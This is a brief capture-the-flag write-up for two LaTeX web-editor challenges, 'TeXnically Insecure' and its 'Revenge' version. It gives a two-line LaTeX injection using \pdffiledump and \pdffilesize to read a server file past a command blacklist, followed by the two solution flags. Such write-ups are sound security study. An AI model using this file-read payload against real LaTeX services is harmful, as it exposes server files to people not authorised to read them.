# TeXnically Insecure

Solved by: @vicevirus

## Question:
Note: It may be a good idea to test your exploit locally first. However, if you manage to break the challenge, simply restart it.

After starting my studies, I wanted to play around with LaTeX. So I built a web-based editor! Unfortunately, people have tried hacking it, so I needed to blacklist some commands. But I’m sure it’s 100% secure now! :) I also made the app restart if it crashes, I just hope that people can’t abuse that for something. But hey, it’s just a restart, right? What could possibly go wrong?

# TeXnically Insecure Revenge

Solved by: @vicevirus @lilacjade

## Solution:
Same solution for both
```
\ttfamily
\pdffiledump offset 0 length \pdffilesize{/flag/flag.txt}{/flag/flag.txt}
```

**Flag:** `PP{g3t-t3x3d::6OkswQq1pRgF}` & `PP{g3t-t3x3d-by-l3g4cy-c0mm4nd5::fnAVVY7-3nWo}`
